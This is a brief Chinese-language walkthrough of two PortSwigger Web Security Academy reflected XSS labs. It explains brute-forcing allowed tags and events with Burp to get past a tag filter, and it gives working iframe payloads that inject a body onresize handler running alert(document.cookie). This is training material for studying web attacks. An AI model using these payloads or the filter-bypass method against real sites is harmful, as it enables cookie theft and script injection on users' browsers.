## 1. Reflected XSS into HTML context with nothing encoded

很简单的一道题，有手就行

## 2.Reflected XSS into HTML context with most tags and attributes blocked

题目说过滤了大多数标签，去找找还有什么标签可以使用。

直接用burp爆破tag和event（看状态码）

得到了tag为`body`，event为`onresize`

`onresize`要在窗口大小被改变的时候触发

用题目的exlpoit，在body部分构造一个iframe，然后onload事件在触发的时候改变大小

payload:(因为是在body部分，记得提前转码，好像不用转码也能过)

```html
<iframe src="https://acc91f9b1fff1f7980540718002a0084.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
<iframe src="https://ac321fb51e21f4e780230d4600710017.web-security-academy.net/?search=<body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
```

